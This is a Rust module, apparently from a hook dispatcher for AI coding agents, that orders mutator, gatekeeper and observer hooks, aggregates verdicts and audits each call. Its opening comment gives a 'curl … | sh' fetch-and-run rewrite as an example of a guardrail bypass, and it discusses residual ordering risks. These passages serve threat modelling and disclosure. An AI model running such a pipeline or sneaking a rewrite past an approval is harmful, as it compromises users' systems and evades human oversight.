// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 The Grimoire Authors

//! The canonical response (C-003) and the tier pipeline (Decision O, C-011).
//!
//! ## Decision O is an ordering invariant, not a scheduling preference
//!
//! Ordering was originally specified *within* the mutator tier but not
//! *between* tiers, and the gap is a guardrail bypass rather than an
//! inelegance: a `gatekeeper` could allow `{"command": "cargo build"}` and a
//! `mutator` later in the same declaration-ordered list rewrite it to
//! `curl … | sh`, with grim emitting one aggregated `allow` **plus** the
//! rewrite. The guardrail would have approved bytes that never ran — and the
//! declaration order it depended on is the installing user's order, mutable by
//! an unrelated `grim add`.
//!
//! The invariant, in four parts:
//!
//! 1. every `mutator` runs **first**, serially, in declaration order,
//!    threading each output into the next as input, producing **one** final
//!    input;
//! 2. that final input is submitted to **every** `gatekeeper`;
//! 3. any `deny` is **absorbing** and suppresses the mutation entirely;
//! 4. `ask` outranks `allow`.
//!
//! So a gatekeeper always judges the bytes that will actually run and **never
//! sees pre-mutation input**. The accepted cost is that a mutator cannot react
//! to a denial. [`TierPlan`] is where part 1 and part 2 stop being prose:
//! the gatekeepers are unreachable until the mutator list is exhausted,
//! because they are a separate field consumed in a separate phase.
//!
//! **Residual risk, disclosed because grim cannot fix it.** This orders only
//! the hooks *grim* dispatches. Codex and Copilot **union** hook sources, so a
//! user's hand-authored native hook can sit in the same per-event array and
//! the **vendor** decides firing order between it and grim's dispatcher.
//! Kubernetes hit exactly this with independent mutating admission webhooks
//! and answered it with `reinvocationPolicy: IfNeeded`; no vendor here offers
//! an equivalent. A `gatekeeper` verdict can therefore be correct when grim
//! issues it and stale by the time the tool runs.
//!
//! ## Serial, not parallel, and that is the point
//!
//! Claude resolves competing `updatedInput` as last-process-to-exit-wins and
//! most other clients leave ordering `NOT DOCUMENTED`. Running the mutators
//! serially converts a race into a reproducible pipeline — which is a
//! capability no vendor offers, and the reason grim owns ordering at all.
//! Threading means grim re-encodes the tool input between mutators; that is
//! not the byte-preservation C-002 protects, because after the first rewrite
//! the value is grim's own composition rather than the client's payload.

use std::io::{Read as _, Write as _};
use std::path::{Path, PathBuf};
use std::process::{Child, Command, Stdio};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use crate::audit::{AuditInput, AuditLog, AuditOutcome, AuditRecord, AuditVerdict};
use crate::diag::Diagnostic;
use crate::envelope::{self, EnvelopeMeta, ToolRef};
use crate::table::DispatchEntry;
use crate::{CanonicalEvent, DEFAULT_TIMEOUT_SECS, HookHandler, HookPayloadMode, HookTier, MAX_TIMEOUT_SECS};

/// Maximum bytes grim reads back from a payload's stdout.
///
/// A canonical response is a small object; a payload that writes more than this
/// is either broken or hostile, and an unbounded read on the hot path of every
/// tool call is CWE-400. The read stops at the cap, which truncates the JSON and
/// degrades to [`CanonicalResponse::no_opinion`] — the same answer an unparsable
/// response already produces.
const MAX_RESPONSE_BYTES: u64 = 64 * 1024;

pub use crate::response::{CanonicalResponse, Decision};

/// The armed set, partitioned by the order Decision O fixes.
///
/// Two phases in two fields, and the separation is the enforcement: nothing
/// can submit a pre-mutation input to a gatekeeper, because the gatekeepers
/// are not reachable from the phase that runs the mutators.
///
/// Borrowed from the caller's row set — the plan is an ordering over rows the
/// dispatch table owns, never a copy of them.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct TierPlan<'a> {
    /// Every `mutator`, in declaration order. Run serially, each output
    /// threaded into the next.
    pub mutators: Vec<&'a DispatchEntry>,
    /// Every `gatekeeper`, all judging the one final input.
    pub gatekeepers: Vec<&'a DispatchEntry>,
    /// Every `observer`. Their responses cannot change what happens, so they
    /// run in the second phase and their verdicts are discarded — listed
    /// rather than dropped here because they still produce audit records.
    pub observers: Vec<&'a DispatchEntry>,
}

/// One hook's answer, paired with the identity the audit trail records.
#[derive(Debug, Clone, PartialEq)]
pub struct HookOutcome {
    /// `<artifact>/<id>`.
    pub hook: String,
    /// The tier the entry declared — which decides whether its verdict counts
    /// and whether its rewrite is honoured.
    pub tier: HookTier,
    /// What it returned, already degraded to
    /// [`CanonicalResponse::no_opinion`] if it timed out or answered
    /// unusably.
    pub response: CanonicalResponse,
    /// Why a `gatekeeper` was withheld by grim itself (D2); always `None` for
    /// the other tiers, whose withholding keeps today's behaviour.
    pub withheld: Option<WithheldCause>,
}

/// Why a selected `gatekeeper` gave no usable verdict and was withheld.
///
/// Grim-owned infrastructure failures and payload-owned ones (a crash, a timeout,
/// garbage on stdout, a handler that cannot be spawned) share one path: the
/// launcher errors instead of forging "no opinion". Observers and mutators are
/// never withheld.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum WithheldCause {
    /// The audit trail could not be appended to (C-012).
    AuditUnwritable,
    /// The `payload = "file"` envelope could not be written.
    PayloadFileWrite,
    /// The hook's envelope could not be built. The launcher exits 1 (internal failure).
    EnvelopeBuild,
    /// A reader or writer thread for the handler could not be started. The
    /// launcher exits 1 (internal failure).
    ThreadSpawn,
    /// The payload crashed, timed out, answered with something unusable or could not
    /// be spawned. The launcher exits 1 (internal failure).
    PayloadFailed,
}

/// [`compose`]'s result: the one response, and whether a gatekeeper was
/// withheld without a `deny` having been composed.
#[derive(Debug, Clone, PartialEq)]
pub struct Composition {
    pub response: CanonicalResponse,
    /// Set only per PD-6: some selected gatekeeper was withheld **and** no
    /// gatekeeper that ran composed a `deny`. A composed `deny` always wins,
    /// because an error exit would turn a block into a non-blocking error in
    /// Claude.
    pub withheld: Option<WithheldCause>,
}

/// Everything one `grim-hook` invocation knows that is **not** per hook —
/// grim's half of the C-002 envelope, plus the audit sink.
///
/// **This type is the Implement phase's answer to F-B**, and the choice it
/// records is "`compose` takes the envelope meta plus the audit sink" rather
/// than "the spawn moves out into `dispatch`". Two reasons, and the second is
/// the load-bearing one:
///
/// - The stubbed `compose(&TierPlan, raw)` could not build an envelope at all:
///   it saw only what a [`DispatchEntry`] carries (`artifact`, `id`, `event`,
///   `tier`), so `client`, `scope`, `native_event`, `cwd`, `session_id` and
///   `correlation_id` had nowhere to come from.
/// - **C-012's rule is per hook and per tier** — *do not spawn this observer*,
///   *spawn this mutator but discard its rewrite* — so the decision has to sit
///   where the spawn is. Moving the spawn out into `dispatch` would have taken
///   Decision O's ordering with it: the mutator chain's threading and the
///   "gatekeepers see only the final input" invariant are the reason `TierPlan`
///   has two fields consumed in two phases, and splitting the loop from the plan
///   would put that invariant back into prose.
///
/// Borrowed throughout, like [`EnvelopeMeta`]: every value here is one the
/// runtime already holds.
#[derive(Debug, Clone, Copy)]
pub struct Invocation<'a> {
    /// grim's name for the invoking client — a lookup key, never a trust input.
    pub client: &'a str,
    /// The armed root in readable form (`global`, or a workspace path), taken
    /// from the dispatch table's own `root` field. Diagnostics and the
    /// envelope's `scope` member; never matched against anything (C-007).
    pub scope: &'a str,
    /// The canonical firing event.
    pub event: CanonicalEvent,
    /// The client's own spelling of that event, needed because the event echo
    /// must carry the **firing** name.
    pub native_event: &'a str,
    /// The working directory the **client** reported, out of its own payload.
    pub cwd: &'a str,
    /// The client's session identifier, when it supplies one.
    pub session_id: Option<&'a str>,
    /// Joins this invocation's records and log lines to each other.
    pub correlation_id: &'a str,
    /// Where the audit records go (C-012). The trail is the dispatch table's
    /// sibling of the dispatch table.
    pub audit: &'a AuditLog,
}

/// Partition `armed` into Decision O's phases, preserving declaration order
/// within each.
///
/// Declaration order is the dispatch table's row order, which
/// `hook_registrar::desired_entries` already sorts deterministically so a
/// re-write with no change is byte-identical. This function must not reorder
/// within a tier: the mutator chain's meaning depends on it.
pub fn order<'a>(armed: &[&'a DispatchEntry]) -> TierPlan<'a> {
    let of_tier = |tier: HookTier| -> Vec<&'a DispatchEntry> {
        armed.iter().copied().filter(|entry| entry.tier == tier).collect()
    };
    TierPlan {
        mutators: of_tier(HookTier::Mutator),
        gatekeepers: of_tier(HookTier::Gatekeeper),
        observers: of_tier(HookTier::Observer),
    }
}

/// The aggregate verdict over every hook whose tier lets it have one.
///
/// Parts 3 and 4 of Decision O, as one `max` over [`Decision::rank`]: `deny`
/// is absorbing because it ranks highest, and `ask` outranks `allow` because
/// it ranks above it. An empty set is [`Decision::None`].
///
/// **Only a `gatekeeper` has a verdict**, and the Implement phase narrowed this
/// from "not an observer" to exactly that. A tier is a *capability
/// declaration* — `gatekeeper` is the one that says "may return a verdict that
/// blocks the operation", `mutator` says "may rewrite the tool input" — and
/// letting a mutator's `deny` through would grant it a capability its
/// declaration does not carry. That matters beyond tidiness: C-011's control 6
/// shows the user the **tier** in the approval prompt with distinct mutator
/// wording, so a user who approved a `mutator` was never told it could block
/// their tool calls. A hook that needs both capabilities declares both entries,
/// so nothing is lost. A withheld verdict is reported at the call site rather
/// than dropped in silence — see [`invoke`].
pub fn aggregate(outcomes: &[HookOutcome]) -> Decision {
    outcomes
        .iter()
        .filter(|outcome| outcome.tier == HookTier::Gatekeeper)
        .map(|outcome| outcome.response.decision)
        .max_by_key(|decision| decision.rank())
        .unwrap_or(Decision::None)
}

/// Assemble the one canonical response grim returns for this invocation.
///
/// Runs [`order`]'s two phases, threads the mutator chain, submits the single
/// final input to every gatekeeper, aggregates with [`aggregate`], and — part
/// 3 — **suppresses the mutation entirely** when the verdict is
/// [`Decision::Deny`]: denied bytes must not also be rewritten, or the client
/// would carry a rewrite for an operation that never runs.
///
/// # Errors
///
/// None. Every failure a hook can produce degrades to
/// [`CanonicalResponse::no_opinion`], because the caller's only permitted exit
/// code is 0. A gatekeeper grim itself had to withhold is reported through
/// [`Composition::withheld`], never as a verdict.
pub fn compose(
    plan: &TierPlan<'_>,
    invocation: &Invocation<'_>,
    raw: &[u8],
    diagnostics: &mut Vec<Diagnostic>,
) -> Composition {
    // Read once, not once per hook: `build` runs for every armed row, and the
    // tool does not change between them.
    let tool = envelope::tool_from_raw(raw);

    // **C-012, probed once.** Whether the trail can be appended to is a property
    // of the filesystem, not of any one hook, so it is established here and the
    // *tier-aware* consequence is applied per hook inside `invoke`.
    let logged = invocation.audit.writable();
    // One deadline for the whole invocation (security review W3), strictly
    // below the client timeout of every registration that could have invoked
    // it. Hooks run serially, each up to its own timeout, so without it the
    // client can kill `grim-hook` first — and on a fail-closed event
    // (Copilot `preToolUse`) that non-zero exit makes grim the blocker (I3).
    let deadline = Instant::now() + invocation_budget(plan);
    if !logged {
        diagnostics.push(Diagnostic::warn(format!(
            "the hook audit trail at {} cannot be appended to; observers and gatekeepers will not \
             be spawned and any mutator rewrite will be discarded. No hook is denied; only the \
             launcher turns a withheld gatekeeper into a non-zero exit",
            invocation.audit.path().display()
        )));
    }

    let mut outcomes: Vec<HookOutcome> = Vec::new();
    // The threaded tool input. `None` when the payload names no tool at all, in
    // which case there is nothing for a mutator to rewrite.
    let mut input: Option<Vec<u8>> = tool.map(|tool| tool.input.to_vec());
    let mut rewrote: Vec<String> = Vec::new();

    // ── Phase 1: every mutator, serially, in declaration order ──────────────
    //
    // Serial is the capability, not a simplification: Claude resolves competing
    // `updatedInput` as last-process-to-exit-wins and most clients leave the
    // ordering undocumented, so threading the chain converts a race into a
    // reproducible pipeline (Decision O part 1).
    for entry in &plan.mutators {
        let outcome = invoke(
            entry,
            invocation,
            raw,
            tool_view(tool, input.as_deref()),
            logged,
            deadline,
            diagnostics,
        );
        if let Some(rewrite) = outcome.response.updated_input.as_ref() {
            match serde_json::to_vec(rewrite) {
                Ok(bytes) => {
                    // Grim's own composition from here on, which is why
                    // re-encoding it is not the byte-preservation C-002 protects:
                    // after the first rewrite the value is no longer the client's.
                    input = Some(bytes);
                    rewrote.push(outcome.hook.clone());
                }
                Err(e) => diagnostics.push(Diagnostic::warn(format!(
                    "{}: its rewrite could not be encoded and was dropped: {e}",
                    outcome.hook
                ))),
            }
        }
        outcomes.push(outcome);
    }

    // ── Phase 2: every gatekeeper, then every observer, on the FINAL input ───
    //
    // Unreachable from phase 1 by construction (`TierPlan`'s two fields), which
    // is what makes "a gatekeeper never observes pre-mutation input" an ordering
    // invariant rather than a comment (Decision O part 2).
    let threaded = tool_view(tool, input.as_deref());
    for entry in plan.gatekeepers.iter().chain(&plan.observers) {
        outcomes.push(invoke(entry, invocation, raw, threaded, logged, deadline, diagnostics));
    }

    Composition {
        response: assemble(&outcomes, input.as_deref(), &rewrote),
        withheld: withheld_cause(&outcomes),
    }
}

/// PD-6's precedence: the first withheld gatekeeper's cause, unless a gatekeeper
/// that ran composed a `deny` or an `ask`.
///
/// Never weakens a composed `deny` or `ask`: an error exit would turn either into a
/// non-blocking error in Claude, which proceeds without the prompt. Observers and
/// mutators carry no cause, so withholding them changes nothing here.
fn withheld_cause(outcomes: &[HookOutcome]) -> Option<WithheldCause> {
    if matches!(aggregate(outcomes), Decision::Deny | Decision::Ask) {
        return None;
    }
    outcomes.iter().find_map(|outcome| outcome.withheld)
}

/// How long one `grim-hook` may take: the shortest client timeout among
/// the registrations `plan`'s rows sit under, minus [`DEADLINE_MARGIN`].
///
/// Groups rows by matcher with the loosest timeout per group, as
/// `hook_registrar::one_per_matcher` registers them; the shortest group wins
/// because grim cannot tell which registration invoked it. So an observer
/// sharing a gatekeeper's matcher cannot cut its budget. Unset counts as
/// [`DEFAULT_TIMEOUT_SECS`] (at or below every v1 client's default); a table
/// value past [`MAX_TIMEOUT_SECS`] is clamped so the deadline cannot overflow.
// ponytail: keys on grim's matcher, so a vendor that ever merged two of them
// would only make this budget tighter than the client's, never looser.
fn invocation_budget(plan: &TierPlan<'_>) -> Duration {
    // A list, not a map: a handful of rows, and a map's code is a measurable share of
    // the launcher's size budget.
    let mut registrations: Vec<(Option<&str>, u64)> = Vec::new();
    for entry in plan.mutators.iter().chain(&plan.gatekeepers).chain(&plan.observers) {
        // `*` registers as match-all, the same registration as no matcher.
        let matcher = entry.matcher.as_deref().filter(|m| *m != "*");
        let timeout = entry.timeout.unwrap_or(DEFAULT_TIMEOUT_SECS).min(MAX_TIMEOUT_SECS);
        match registrations.iter_mut().find(|(m, _)| *m == matcher) {
            Some((_, loosest)) => *loosest = (*loosest).max(timeout),
            None => registrations.push((matcher, timeout)),
        }
    }
    let shortest = registrations
        .into_iter()
        .map(|(_, timeout)| timeout)
        .min()
        .unwrap_or(DEFAULT_TIMEOUT_SECS);
    Duration::from_secs(shortest).saturating_sub(DEADLINE_MARGIN)
}

/// Headroom kept between grim's own deadline and the client's timeout, so grim
/// answers — and exits 0 — before the client gives up on it.
const DEADLINE_MARGIN: Duration = Duration::from_millis(500);

/// Record that each armed hook in `declined` had its matcher decline this tool
/// call (S-004) — **one write for the whole invocation**.
///
/// Written even though nothing was spawned, because *"the guardrail did not
/// apply here"* is the most common forensic question about a hook, and an absent
/// record cannot distinguish it from *"the guardrail was never armed"*. The
/// trail's own rotation bounds the volume.
///
/// **Takes the whole declined set rather than one entry** (F-2). The records are
/// unchanged and so is their order; what changed is that the `create_dir_all`,
/// the rotation `statx` and the open are paid once per invocation instead of once
/// per armed hook — measured at +0.04 ms per hook on ext4 but **+14.1 ms per
/// hook on a 9P `$GRIM_HOME`**, where ten armed-but-unmatched hooks made every
/// tool call cost 142 ms at p50. An empty set writes nothing at all, which is
/// what keeps the two early-return scenarios from ever creating a trail.
///
/// Lives here rather than in the dispatch entry point so that **one module owns every
/// write to the trail** — the record shape and the sanitization boundary are then
/// in one place rather than two.
pub fn record_no_matches(invocation: &Invocation<'_>, declined: &[&DispatchEntry], diagnostics: &mut Vec<Diagnostic>) {
    if declined.is_empty() {
        return;
    }
    let records: Vec<AuditRecord> = declined
        .iter()
        .map(|entry| {
            AuditRecord::new(&AuditInput {
                hook_id: &entry.id,
                event: entry.event,
                client: invocation.client,
                tier: entry.tier,
                correlation_id: invocation.correlation_id,
                digest: entry.resolved_digest.as_deref().unwrap_or_default(),
                changed_fields: &[],
                payload_bytes: 0,
                response_bytes: 0,
                // No verdict was reached, because nothing ran.
                verdict: None,
                outcome: AuditOutcome::NoMatch,
            })
        })
        .collect();
    append_records(invocation.audit, &records, diagnostics);
}

/// The tool view one hook is handed: the client's tool **name** with the
/// current threaded **input**.
fn tool_view<'a>(tool: Option<ToolRef<'a>>, input: Option<&'a [u8]>) -> Option<ToolRef<'a>> {
    let tool = tool?;
    Some(ToolRef {
        name: tool.name,
        input: input.unwrap_or(tool.input),
    })
}

/// Append one record.
///
/// The shape [`invoke`] needs: a record produced *after* a spawn cannot be
/// batched with the next hook's, because the next hook has not run yet.
fn append_record(log: &AuditLog, record: AuditRecord, diagnostics: &mut Vec<Diagnostic>) {
    append_records(log, &[record], diagnostics);
}

/// Append a whole invocation's records in one open and one write.
///
/// The single seam for every trail write, so the F-2 batch and the per-record
/// path report a failure the same way. Batching is for the records one
/// invocation **already holds**, which is the no-match set; holding a post-spawn
/// record back to join a later one would trade durability for a syscall.
fn append_records(log: &AuditLog, records: &[AuditRecord], diagnostics: &mut Vec<Diagnostic>) {
    // The trail is forensics; a failure to write it must never change what grim
    // returns (I3). The tier-aware consequence of an unwritable trail was already
    // decided by the `AuditLog::writable` probe before the spawn, so a failure
    // *here* — the trail becoming unwritable between the probe and the append —
    // is reported and nothing more.
    if let Err(e) = log.append_all(records) {
        diagnostics.push(Diagnostic::warn(format!(
            "the hook audit record could not be appended: {e}"
        )));
    }
}

/// The audit outcome for a hook that ran while the trail was unwritable.
///
/// **A named function so the rule can be tested** (round 3, S4/M6): it was an
/// assignment inside an `if`, and moving it back outside — the bug it fixes —
/// left the whole suite green.
///
/// [`AuditOutcome::RewriteDiscardedUnlogged`] is a claim about a rewrite that
/// *existed* and was dropped. Recording it for a mutator that returned no
/// `updated_input` made the trail read as a suppressed mutation that never
/// happened — a false positive in the one record a reader consults to ask whether
/// an unlogged mutation occurred. A mutator that rewrote nothing simply
/// [`Completed`](AuditOutcome::Completed); the unwritable trail is already
/// reported on its own.
fn unlogged_mutator_outcome(had_rewrite: bool) -> AuditOutcome {
    if had_rewrite {
        AuditOutcome::RewriteDiscardedUnlogged
    } else {
        AuditOutcome::Completed
    }
}

/// Run one hook and record it.
///
/// `logged` is the C-012 probe's answer, and the whole tier table hangs off it:
///
/// | Tier | `logged == false` |
/// |---|---|
/// | `observer`, `gatekeeper` | **not spawned**, no verdict, [`AuditOutcome::NotSpawnedUnlogged`] |
/// | `mutator` | **spawned**; if it rewrote, the rewrite is **discarded** and the outcome is
///   [`AuditOutcome::RewriteDiscardedUnlogged`] with verdict `Some(Mutate)`. A mutator that
///   rewrote **nothing** reports [`Completed`](AuditOutcome::Completed) — see
///   [`unlogged_mutator_outcome`] |
///
/// Never returns a `deny` it was not given: every failure — an unbuildable
/// envelope, a failed spawn, a timeout, an unusable answer — degrades to
/// [`CanonicalResponse::no_opinion`] (I3). A gatekeeper that grim itself withheld
/// also carries its [`WithheldCause`]; the launcher exits non-zero on that.
fn invoke(
    entry: &DispatchEntry,
    invocation: &Invocation<'_>,
    raw: &[u8],
    tool: Option<ToolRef<'_>>,
    logged: bool,
    deadline: Instant,
    diagnostics: &mut Vec<Diagnostic>,
) -> HookOutcome {
    // The label every log line, the envelope's `hook` field and the audit record
    // carry for this entry.
    //
    // **The diagnostic sink is not sanitized, and that is the P-6 residual.** The
    // envelope drops any value with a brace, bracket or control character
    // (`envelope::is_flat_scalar`) and `AuditRecord::new` sanitizes on the way in,
    // so those two are closed; a log line is not. What holds it today is
    // upstream: `id` is charset-validated at `grim build` *and* re-validated
    // against the materialized manifest at the install seam
    // (`HookManifest::validate_installed`), so no row grim arms can carry a
    // terminal-escape sequence here. The gap that survives is a **dispatch table
    // written by a grim that predates that rule** — `read_table` re-checks the
    // matcher length and `payload_dir`, never the `id`. Deliberately not added
    // there: that reader rejects the whole table on a bad row, so one stale `id`
    // would disarm every hook on the machine, which is the wrong trade for a
    // cosmetic sink. The next `grim install` rewrites the root wholesale.
    let hook = format!("{}/{}", entry.artifact, entry.id);
    let digest = entry.resolved_digest.as_deref().unwrap_or_default();
    let record = |outcome: AuditOutcome, verdict: Option<AuditVerdict>, sizes: (usize, usize), changed: &[String]| {
        AuditRecord::new(&AuditInput {
            hook_id: &entry.id,
            event: entry.event,
            client: invocation.client,
            tier: entry.tier,
            // The envelope's own id, so the record joins to the stdin grim
            // wrote for this invocation (G-1).
            correlation_id: invocation.correlation_id,
            // Copied, never computed — C-009. `None` (a path-sourced dev
            // install) records the empty string rather than a fresh digest.
            digest,
            changed_fields: changed,
            payload_bytes: sizes.0,
            response_bytes: sizes.1,
            verdict,
            outcome,
        })
    };
    // Only a gatekeeper's withholding is a cause; the other tiers stay "no opinion"
    // whatever the caller's exit status.
    let withheld = |cause: WithheldCause| (entry.tier == HookTier::Gatekeeper).then_some(cause);
    let degraded = |response: CanonicalResponse, withheld: Option<WithheldCause>| HookOutcome {
        hook: hook.clone(),
        tier: entry.tier,
        response,
        withheld,
    };

    let meta = EnvelopeMeta {
        event: invocation.event,
        native_event: invocation.native_event,
        client: invocation.client,
        scope: invocation.scope,
        hook: &hook,
        tier: entry.tier,
        cwd: invocation.cwd,
        session_id: invocation.session_id,
        correlation_id: invocation.correlation_id,
        payload_dir: &entry.payload_dir,
        tool,
    };
    let envelope = match envelope::build(&meta, raw) {
        Ok(envelope) => envelope,
        Err(e) => {
            // Unreachable through `run::dispatch`, which refuses a non-object
            // payload before any hook runs; reported rather than
            // panicked so a second caller cannot turn it into an exit 101.
            diagnostics.push(Diagnostic::warn(format!("{hook}: {e}; nothing was spawned")));
            append_record(
                invocation.audit,
                record(AuditOutcome::SpawnFailed, None, (0, 0), &[]),
                diagnostics,
            );
            return degraded(CanonicalResponse::no_opinion(), withheld(WithheldCause::EnvelopeBuild));
        }
    };

    // C-012, rows 1 and 2: withhold the invocation itself.
    if !logged && entry.tier != HookTier::Mutator {
        diagnostics.push(Diagnostic::warn(format!(
            "{hook} was not spawned: its invocation could not be audited, and an unauditable \
             {} is withheld rather than run unlogged (C-012). The tool call proceeds",
            entry.tier
        )));
        // Attempted even though the probe failed: the trail may have become
        // writable in between, and a record of a withheld invocation is exactly
        // what a reader of the trail needs. A failure here is already reported by
        // `append_record`.
        append_record(
            invocation.audit,
            record(AuditOutcome::NotSpawnedUnlogged, None, (envelope.len(), 0), &[]),
            diagnostics,
        );
        return degraded(
            CanonicalResponse::no_opinion(),
            withheld(WithheldCause::AuditUnwritable),
        );
    }

    let spawned = spawn_payload(
        entry,
        &meta,
        invocation.audit.path().parent(),
        &envelope,
        deadline,
        diagnostics,
    );
    let (stdout, failure) = match spawned {
        Ok((stdout, None)) => (stdout, None),
        Ok((stdout, Some(outcome))) => (stdout, Some(outcome)),
        Err(e) => {
            let what = match e {
                SpawnError::Thread(_) => "a thread for its handler could not be started",
                SpawnError::PayloadFile(_) | SpawnError::Spawn(_) => "its handler could not be spawned",
            };
            diagnostics.push(Diagnostic::warn(format!(
                "{hook}: {what} ({}); no verdict from it",
                e.io()
            )));
            append_record(
                invocation.audit,
                record(AuditOutcome::SpawnFailed, None, (envelope.len(), 0), &[]),
                diagnostics,
            );
            let cause = match e {
                SpawnError::PayloadFile(_) => withheld(WithheldCause::PayloadFileWrite),
                SpawnError::Thread(_) => withheld(WithheldCause::ThreadSpawn),
                SpawnError::Spawn(_) => withheld(WithheldCause::PayloadFailed),
            };
            return degraded(CanonicalResponse::no_opinion(), cause);
        }
    };

    let sizes = (envelope.len(), stdout.len());
    let mut response = match failure {
        Some(outcome) => {
            append_record(invocation.audit, record(outcome, None, sizes, &[]), diagnostics);
            return degraded(CanonicalResponse::no_opinion(), withheld(WithheldCause::PayloadFailed));
        }
        // **Exit 0 with empty stdout is the fail-safe shape, not a malformed
        // answer**, and it is what every payload that has nothing to say
        // produces. Recording it as `ResponseRejected` would make the most
        // ordinary invocation in the trail read like a broken hook.
        None if stdout.iter().all(u8::is_ascii_whitespace) => CanonicalResponse::no_opinion(),
        None => match serde_json::from_slice::<CanonicalResponse>(&stdout) {
            Ok(response) => response,
            Err(e) => {
                diagnostics.push(Diagnostic::warn(format!(
                    "{hook}: its answer was not a canonical response ({e}); no verdict"
                )));
                append_record(
                    invocation.audit,
                    record(AuditOutcome::ResponseRejected, None, sizes, &[]),
                    diagnostics,
                );
                return degraded(CanonicalResponse::no_opinion(), withheld(WithheldCause::PayloadFailed));
            }
        },
    };

    // An observer's verdict changes nothing, so it never reaches `aggregate`
    // (which filters the tier) — but the trail records what the hook *said*.
    let mut verdict = Some(verdict_of(&response));
    let mut changed = changed_fields(tool.map(|tool| tool.input), response.updated_input.as_ref());
    let mut outcome = AuditOutcome::Completed;

    // C-012, row 3: the invocation stands, the rewrite does not.
    if !logged {
        if response.updated_input.take().is_some() {
            diagnostics.push(Diagnostic::warn(format!(
                "{hook} ran but its rewrite was discarded: the invocation could not be audited, and \
                 an UNLOGGED MUTATION is the one outcome this failure mode must not produce \
                 (C-012). The tool call proceeds with its original input"
            )));
            verdict = Some(AuditVerdict::Mutate);
            outcome = unlogged_mutator_outcome(true);
        }
        // The rewrite never happened, so no field changed.
        changed = Vec::new();
    }
    // A tier does not get a capability its declaration does not carry, in either
    // direction — and both are reported rather than dropped in silence, because a
    // hook whose answer is being ignored looks exactly like a hook that is working.
    if entry.tier != HookTier::Mutator && response.updated_input.take().is_some() {
        diagnostics.push(Diagnostic::warn(format!(
            "{hook} is declared `{}`, so its rewrite was ignored — only a `mutator` may rewrite a \
             tool's input",
            entry.tier
        )));
        changed = Vec::new();
    }
    if entry.tier != HookTier::Gatekeeper && response.decision != Decision::None {
        diagnostics.push(Diagnostic::warn(format!(
            "{hook} is declared `{}`, so its `{}` verdict was ignored — only a `gatekeeper` may \
             return a verdict, and the approval prompt the user saw named this tier",
            entry.tier, response.decision
        )));
    }

    append_record(invocation.audit, record(outcome, verdict, sizes, &changed), diagnostics);
    HookOutcome {
        hook,
        tier: entry.tier,
        response,
        withheld: None,
    }
}

/// The canonical verdict, in the audit trail's vocabulary.
fn verdict_of(response: &CanonicalResponse) -> AuditVerdict {
    if response.updated_input.is_some() {
        return AuditVerdict::Mutate;
    }
    match response.decision {
        Decision::Allow => AuditVerdict::Allow,
        Decision::Deny => AuditVerdict::Deny,
        Decision::Ask => AuditVerdict::Ask,
        Decision::None => AuditVerdict::NoOpinion,
    }
}

/// The **names** of the top-level tool-input fields a rewrite changed.
///
/// Names only, never values: recording the values is the secret-capture and
/// log-injection path C-012's redaction level exists to close. An input or a
/// rewrite that is not an object contributes no names rather than a guess.
fn changed_fields(original: Option<&[u8]>, rewrite: Option<&serde_json::Value>) -> Vec<String> {
    let Some(rewrite) = rewrite.and_then(serde_json::Value::as_object) else {
        return Vec::new();
    };
    let before: serde_json::Map<String, serde_json::Value> = original
        .and_then(|bytes| serde_json::from_slice(bytes).ok())
        .unwrap_or_default();
    // Both key lists are already in order, but not each other's: a sorted,
    // deduplicated union.
    let mut changed: Vec<String> = Vec::new();
    for key in rewrite
        .iter()
        .filter(|(key, value)| before.get(*key) != Some(*value))
        .map(|(key, _)| key)
        .chain(before.keys().filter(|key| !rewrite.contains_key(*key)))
    {
        if let Err(at) = changed.binary_search(key) {
            changed.insert(at, key.clone());
        }
    }
    changed
}

/// Assemble the one response for this invocation out of every hook's answer.
///
/// Decision O parts 3 and 4 live in [`aggregate`]; what is here is the rest of
/// the roll-up:
///
/// - the **reason** is the deciding hook's own, so the text the client shows
///   belongs to the hook that produced the verdict;
/// - a **`deny` suppresses the rewrite entirely** — denied bytes must not also be
///   rewritten, or the client carries a rewrite for an operation that never runs;
/// - a surviving rewrite **describes itself** through `context` (S-016, mutator
///   control 5): no vendor does this, and a silent rewrite is indistinguishable
///   from the model having asked for the new command;
/// - an **observer contributes nothing at all** — not a verdict, not a reason,
///   not context. A tier that changes nothing must not be able to change what
///   the agent is told either.
fn assemble(outcomes: &[HookOutcome], input: Option<&[u8]>, rewrote: &[String]) -> CanonicalResponse {
    let decision = aggregate(outcomes);
    // Gatekeepers only, matching `aggregate`: the reason the client shows must
    // belong to the hook that actually produced the verdict, so the two filters
    // are the same filter.
    let deciding = outcomes
        .iter()
        .filter(|outcome| outcome.tier == HookTier::Gatekeeper)
        .find(|outcome| decision != Decision::None && outcome.response.decision == decision);

    let updated_input = if decision == Decision::Deny || rewrote.is_empty() {
        None
    } else {
        input.and_then(|bytes| serde_json::from_slice::<serde_json::Value>(bytes).ok())
    };

    let mut context: Vec<String> = Vec::new();
    if updated_input.is_some() {
        context.push(format!(
            "grim rewrote this tool's input before it ran (hook: {})",
            rewrote.join(", ")
        ));
    }
    context.extend(
        outcomes
            .iter()
            .filter(|outcome| outcome.tier != HookTier::Observer)
            .filter_map(|outcome| outcome.response.context.clone()),
    );

    CanonicalResponse {
        decision,
        reason: deciding.and_then(|outcome| outcome.response.reason.clone()),
        context: (!context.is_empty()).then(|| context.join("\n")),
        user_message: outcomes
            .iter()
            .filter(|outcome| outcome.tier != HookTier::Observer)
            .find_map(|outcome| outcome.response.user_message.clone()),
        stop: outcomes
            .iter()
            .any(|outcome| outcome.tier != HookTier::Observer && outcome.response.stop),
        updated_input,
    }
}

/// Why a payload could not be started, split by who owns the failure: a handler
/// that will not spawn is the payload's, a `payload = "file"` envelope or a
/// reader/writer thread grim could not start is grim's own. Both withhold a
/// gatekeeper rather than forging "no opinion".
#[derive(Debug)]
enum SpawnError {
    PayloadFile(std::io::Error),
    Spawn(std::io::Error),
    Thread(std::io::Error),
}

impl SpawnError {
    fn io(&self) -> &std::io::Error {
        match self {
            Self::PayloadFile(e) | Self::Spawn(e) | Self::Thread(e) => e,
        }
    }
}

/// Spawn one payload with the envelope on its stdin and read its answer back.
///
/// Returns the payload's stdout plus, when the invocation did not complete
/// normally, the [`AuditOutcome`] describing why. `Err` is reserved for "the
/// handler could not be started at all" (S-009), which the caller degrades to no
/// opinion.
///
/// Four properties are deliberate:
///
